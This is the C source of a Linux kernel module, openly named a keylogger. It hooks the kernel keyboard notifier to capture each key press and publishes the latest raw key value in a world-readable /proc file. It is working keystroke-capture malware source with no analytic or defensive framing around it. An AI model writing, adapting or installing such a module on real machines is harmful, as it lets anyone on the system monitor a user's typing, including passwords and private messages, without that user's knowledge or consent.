#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/keyboard.h>

#define PROC_NAME "keylogger_info"
#define STATUS_BUF_SIZE 128

static struct proc_dir_entry *proc_file;
static char status_buf[STATUS_BUF_SIZE] = "status: init\n";
static char last_key = '?';

static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
    int len = strlen(status_buf);

    if (*ppos > 0)
    {
        return 0;
    }

    if (copy_to_user(buf, status_buf, len))
    {
        return -EFAULT;
    }

    *ppos = len;
    return len;
}

static const struct proc_ops keylogger_proc_ops =
{
    .proc_read = keylogger_read,
};

static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYSYM && param->down)
    {
        last_key = (char)param->value;

        snprintf(status_buf, STATUS_BUF_SIZE, "last key (raw): %d\n", param->value);
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_cb
};

static int __init keylogger_init(void)
{
    printk(KERN_INFO "keylogger: loaded\n");

    snprintf(status_buf, STATUS_BUF_SIZE, "last key (raw): -1\n");

    register_keyboard_notifier(&keylogger_nb);

    proc_file = proc_create(PROC_NAME, 0444, NULL, &keylogger_proc_ops);

    return 0;
}

static void __exit keylogger_exit(void)
{
    if (proc_file)
    {
        proc_remove(proc_file);
    }

    unregister_keyboard_notifier(&keylogger_nb);

    printk(KERN_INFO "keylogger: unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");